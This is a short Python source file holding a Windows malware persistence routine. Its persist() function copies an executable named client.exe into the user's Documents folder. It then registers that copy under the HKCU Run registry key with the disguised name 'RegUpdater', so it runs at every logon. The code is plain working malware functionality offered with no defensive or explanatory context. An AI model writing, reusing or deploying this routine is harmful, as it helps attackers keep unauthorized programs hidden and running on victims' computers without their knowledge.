import os
import shutil
import _winreg as wreg
import subprocess

def persist():
    path = os.getcwd().strip('/n')
    Null,userprof = subprocess.check_output('set USERPROFILE',shell=True).split('=')
    destination = userprof.strip('\n\r') + '\\Documents\\'  +'client.exe'
    if not os.path.exists(destination):
        shutil.copyfile(path+'\client.exe', destination)                                                 
        key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",0,wreg.KEY_ALL_ACCESS)
        wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ,destination)
        key.Close()
    else:
        pass

